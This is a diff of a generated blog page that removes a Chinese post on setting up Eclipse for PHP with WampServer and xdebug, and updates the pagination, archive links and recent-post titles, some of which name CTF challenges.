-      <a data-url="http://example.com/2020/11/19/page-3/" data-id="ckrosnlub000imow7h0ic8u79" data-title="less 3" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Eclipse for PHP+Wampserver搭建PHP开发环境" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/11/07/Eclipse%20for%20PHP+Wampserver%E6%90%AD%E5%BB%BAPHP%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/" class="article-date">
-  <time class="dt-published" datetime="2020-11-07T10:30:01.000Z" itemprop="datePublished">2020-11-07</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/11/07/Eclipse%20for%20PHP+Wampserver%E6%90%AD%E5%BB%BAPHP%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/">Eclipse for PHP+Wampserver搭建PHP开发环境</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>1.直接安装Eclipse与wampserver</p>
-<p>2.配置wampserver</p>
-<p>用notepad打开C:\wamp\bin\apache\Apache2.4.33\bin下的php.ini，<br>找到最后几行中</p>
-<blockquote>
-<p>[xdebug]<br>zend_extension =”c:/wamp64/bin/php/php5.6.35/zend_ext/php_xdebug-2.5.5-5.6-vc11-x86_64.dll”<br>xdebug.remote_enable = on<br>xdebug.profiler_enable = on<br>xdebug.profiler_enable_trigger = on<br>xdebug.profiler_output_name = cachegrind.out.%t.%p<br>xdebug.profiler_output_dir =”c:/wamp64/tmp”<br>xdebug.show_local_vars=0</p>
-</blockquote>
-<p>3.配置Eclipse</p>
-<p>进入eclipse时选择工作区一定要选择在wamp的www目录，才能便于调试</p>
-<p><img src="https://img-blog.csdn.net/20180713163757517?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NodXhuaHM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="第一步"></p>
-<p>进入界面后，在中间选择add PHP Executable,如图添加php.exe与php.ini</p>
-<p><img src="https://img-blog.csdn.net/2018071316380861?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NodXhuaHM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="第二布"></p>
-<p>配置PHP server，设置默认就好</p>
-<p><img src="https://img-blog.csdn.net/20180713163817709?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NodXhuaHM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="第三步"></p>
-<p>配置PHP debug</p>
-<p><img src="https://img-blog.csdn.net/20180713163826537?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NodXhuaHM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="第四步"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/07/Eclipse%20for%20PHP+Wampserver%E6%90%AD%E5%BB%BAPHP%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/" data-id="ckrosnltt0000mow7ae8lb98j" data-title="Eclipse for PHP+Wampserver搭建PHP开发环境" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/page/6/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/8/">Next &raquo;</a>
+    <a class="extend prev" rel="prev" href="/page/6/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/8/">Next &raquo;</a>
   </nav>
 
 </section>
@@ -554,7 +568,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
     </div>
   </div>
 
@@ -567,23 +581,23 @@
       <ul>
         
           <li>
-            <a href="/2021/07/29/page-90/">buuctf  misc zip</a>
+            <a href="/2021/08/06/page-99/">page</a>
           </li>
         
           <li>
-            <a href="/2021/07/29/page-89/">misc2</a>
+            <a href="/2021/08/06/page-98/">网鼎杯 2018Comment</a>
           </li>
         
           <li>
-            <a href="/2021/07/29/page-88/">羊城杯 2020逃离东南亚</a>
+            <a href="/2021/08/06/page-97/">CSCCTF 2019 QualFlaskLight</a>
           </li>
         
           <li>
-            <a href="/2021/07/29/page-87/">GWCTF 2019枯燥的抽奖</a>
+            <a href="/2021/08/06/page-96/">ciscn2021 cyberpunck</a>
           </li>
         
           <li>
-            <a href="/2021/07/29/page-86/">CISCN2019 华北赛区 Day1 Web1Dropbox</a>
+            <a href="/2021/08/06/page-95/">CISCN2019 总决赛 Day2 Web1Easyweb</a>
           </li>
         
       </ul>
